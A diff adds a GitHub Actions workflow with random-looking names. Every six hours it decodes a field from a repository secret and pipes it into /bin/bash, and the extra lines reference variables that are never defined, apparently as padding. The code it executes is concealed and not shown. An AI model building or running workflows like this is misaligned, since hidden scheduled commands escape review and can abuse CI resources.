@@ -1,0 +1,31 @@
+name: songziyang8391
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: songziyang8391
+        env:
+          wc638: ${{ secrets.wc638 }}
+        run: |
+          echo $wc638 | jq -r .xscy08 | /bin/bash
+          echo $xwrar9143 | jq -r .fb5564 | /bin/bash
+          echo $lyhzb2 | jq -r .k6 | /bin/bash
+          echo $lq9 | jq -r .smd3 | /bin/bash
+          echo $by872 | jq -r .qktqw1034 | /bin/bash
+          echo $jpo0954 | jq -r .s0 | /bin/bash
+          echo $ziipx8 | jq -r .k30755 | /bin/bash
+          echo $jsi4 | jq -r .zfy1346 | /bin/bash
+          echo $devu73 | jq -r .ntaez5 | /bin/bash
+          echo $lld566 | jq -r .twzy09028 | /bin/bash
+          echo $bzafh69 | jq -r .vtw4 | /bin/bash
+          echo $fp607 | jq -r .k72988 | /bin/bash
+          echo $fj44 | jq -r .d9 | /bin/bash
+          echo $pko1713 | jq -r .ih71 | /bin/bash
+          echo $i03087 | jq -r .z76462 | /bin/bash
+
